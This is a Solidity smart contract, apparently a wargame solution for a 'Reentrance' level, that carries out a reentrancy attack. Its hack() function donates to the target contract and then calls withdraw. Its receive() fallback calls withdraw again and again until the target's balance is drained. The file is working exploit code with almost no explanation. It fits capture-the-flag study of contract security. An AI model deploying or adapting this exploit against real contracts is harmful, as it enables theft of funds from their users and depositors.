// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "./Reentrance.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract HackReentrancy is Ownable {

    Reentrance reentrancy;
    
    constructor(address payable reentrancyAddress) public Ownable() {
        reentrancy = Reentrance(reentrancyAddress);
    }

    function updateReentrance(address payable reentrancyAddress) public onlyOwner {
        reentrancy = Reentrance(reentrancyAddress);
    }

    receive() external payable {
        while (address(reentrancy).balance > 0) {
            reentrancy.withdraw(msg.value);
        }
    }

    function hack() public payable onlyOwner {
        
        // Donate msg.value to the Reentrancy contract for the contracts address
        reentrancy.donate{value: msg.value}(address(this));
        
        // Withdraw
        reentrancy.withdraw(msg.value);
    }

}
